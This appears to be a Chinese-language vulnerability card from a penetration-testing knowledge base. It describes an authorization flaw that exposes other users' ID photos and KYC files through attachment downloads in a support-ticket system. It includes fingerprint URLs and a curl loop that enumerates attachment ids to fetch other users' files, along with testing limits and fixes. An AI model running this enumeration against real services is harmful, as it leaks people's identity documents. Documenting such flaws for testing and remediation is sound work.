---
title: 客服工单附件越权下载（证件照 / KYC 材料）
cve: 无（业务逻辑）
severity: high
cvss: 8.2
product: 自研客服工单系统
versions: 任意
ports: 80, 443
keywords: 工单, 附件, 越权, 证件, kyc, 下载
entry: /api/support/attachment?fileId=
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
GET /api/support/ticket/{id}
GET /api/support/attachment?id=123
GET /upload/kyc/2026/xx.jpg
```

## 前置条件

- 普通会员账号（能提工单/传附件）。

## PoC

```bash
# 1) 提一个带附件的工单，拿到自己的 fileId
curl -s -X POST https://target/api/support/ticket -H "Authorization: Bearer <t>" \
  -F 'title=test' -F 'file=@/tmp/a.jpg'
# 响应里的附件 id/url 记下来

# 2) 把 fileId 改成相邻值（自增/时间戳命名都试）
for i in 1001 1002 1003 1004; do
  code=$(curl -s -o /tmp/x.jpg -w '%{http_code}' "https://target/api/support/attachment?id=$i" -H "Authorization: Bearer <t>")
  echo "$i $code $(stat -c%s /tmp/x.jpg)"; file /tmp/x.jpg
done
# 判定：200 且返回别人图片（jpg/png 头）= 命中
```

## 利用步骤

1. 先确认附件 URL 是 id 还是路径（路径型试目录遍历）；
2. 小范围枚举（10 个）确认越权，别批量下载证件；
3. 命中即为"个人信息批量泄露"，写报告时只描述数量与类型；
4. 证据：一个他人附件的 HTTP 头 + 文件类型，内容打码。

## 修复与缓解

- 附件下载校验归属（ticket.user_id = token.uid 或客服角色）；
- 用不可枚举的随机 id；附件加短期签名 URL。

## 参考

- OWASP API1 BOLA；CWE-639。
